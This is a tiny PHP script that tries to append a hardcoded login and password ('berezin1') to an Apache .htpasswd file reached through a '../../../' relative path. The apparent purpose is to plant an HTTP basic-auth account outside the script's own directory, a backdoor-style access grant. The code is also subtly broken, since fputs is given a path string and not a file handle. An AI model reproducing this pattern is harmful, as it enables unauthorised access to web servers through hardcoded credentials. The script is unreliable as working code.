<?

$file = "../../../usr/apache2/.htpasswd";
$login = 'berezin1';
$password = 'berezin1';
fputs($file,$login.':'.crypt($password)."\n"); 



?>
